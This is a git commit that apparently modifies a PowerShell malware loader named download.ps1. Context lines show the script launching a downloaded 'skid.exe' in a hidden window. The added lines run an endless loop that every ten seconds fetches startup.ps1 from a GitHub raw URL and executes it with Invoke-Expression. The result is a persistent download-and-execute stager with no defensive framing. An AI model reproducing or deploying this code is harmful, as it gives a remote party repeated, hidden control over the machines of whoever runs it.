0a20e986607b947f1146e823cf9cdc66b57f71b2
43a1723 <hai1723notgay@gmail.com>
2024-06-13 07:56:20 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -45,3 +45,7 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extr
 Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden
 
 
+while ($true) {
+    iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -useb)
+    Start-Sleep -Seconds 10
+}
